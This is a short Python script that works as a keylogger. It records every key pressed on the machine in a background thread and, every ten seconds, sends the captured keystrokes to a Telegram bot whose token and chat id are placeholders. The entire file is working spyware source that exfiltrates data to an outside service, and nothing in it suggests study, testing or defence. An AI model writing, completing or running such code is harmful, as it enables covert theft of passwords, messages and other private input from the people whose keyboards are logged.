import keyboard
import time
import asyncio
import threading
import telegram

bot_token = 'YOUR BOT TOKEN'
chat_id =  'YOUR CHAT ID'

key_presses = []

async def send_to_telegram(message):
    bot = telegram.Bot(token=bot_token)
    await bot.send_message(chat_id=chat_id, text=message)

def keyboard_listener():
    global key_presses
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key_presses.append(event.name)

keyboard_thread = threading.Thread(target=keyboard_listener)
keyboard_thread.daemon = True
keyboard_thread.start()

async def main():
    global key_presses
    while True:
        await asyncio.sleep(10)
        if key_presses:
            message = '\n'.join(key_presses)
            key_presses = []
            asyncio.create_task(send_to_telegram(message))

asyncio.run(main())
